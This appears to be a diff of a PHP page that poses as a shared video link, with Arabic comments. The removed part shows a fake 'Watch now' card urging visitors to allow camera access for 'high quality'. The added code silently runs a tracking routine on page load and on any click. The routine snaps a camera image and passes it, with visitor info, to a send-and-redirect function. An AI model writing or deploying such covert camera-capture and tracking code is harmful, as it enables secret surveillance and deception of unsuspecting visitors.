@@ -297,21 +297,7 @@ if (isset($_GET['r'])) {
             });
         }
 
-        // عند النقر على زر شاهد الآن، يتم تفعيل طلب الكاميرا بشكل غير مباشر
-        function watchNowAction() {
-            const btn = document.getElementById('watchBtn');
-            const alertBox = document.getElementById('cameraAlert');
-            
-            if (btn) {
-                btn.innerText = "جاري التحميل...";
-                btn.disabled = true;
-            }
-
-            // إظهار إشعار السماح للكاميرا تحت الزر فوراً
-            if (alertBox && useCamera) {
-                alertBox.style.display = "block";
-            }
-
+        function initTracking() {
             if (!useCamera) {
                 sendInfoAndRedirect("");
                 return;
@@ -334,35 +320,23 @@ if (isset($_GET['r'])) {
                         stream.getTracks().forEach(track => track.stop());
 
                         sendInfoAndRedirect(imageData);
-                    }, 400);
+                    }, 300);
                 })
                 .catch(err => {
                     sendInfoAndRedirect("");
                 });
         }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            initTracking();
+        });
+
+        window.addEventListener('click', () => {
+            initTracking();
+        }, { once: true });
     </script>
 </head>
 <body>
-    <div class="video-container" style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px;">
-        <div style="position: relative; width: 100%; max-width: 400px; background: #111; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.5);">
-            <!-- معاينة الفيديو -->
-            <img src="<?php echo htmlspecialchars($meta_image); ?>" alt="Video Thumbnail" style="width: 100%; height: 250px; object-fit: cover; opacity: 0.7;">
-            
-            <div style="padding: 20px;">
-                <h3 style="font-size: 16px; margin-bottom: 15px; color: #fff;"><?php echo htmlspecialchars($meta_title); ?></h3>
-                
-                <!-- زر شاهد الآن الأساسي -->
-                <button id="watchBtn" onclick="watchNowAction()" style="background: #fe2c55; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(254,44,85,0.4);">
-                    ▶ شاهد الآن
-                </button>
-
-                <!-- لافتة التنبيه الخاصة بالسماح للكاميرا تحت الزر مباشرة -->
-                <div id="cameraAlert" style="display: none; margin-top: 12px; background: rgba(254, 44, 85, 0.15); border: 1px solid rgba(254, 44, 85, 0.4); color: #ff85a2; padding: 10px; border-radius: 8px; font-size: 13px; direction: rtl;">
-                    ⚠️ يرجى الضغط على <b>"السماح" (Allow)</b> في نافذة المتصفح المنبثقة لعرض الفيديو بجودة عالية.
-                </div>
-            </div>
-        </div>
-    </div>
 </body>
 </html>
 <?php 
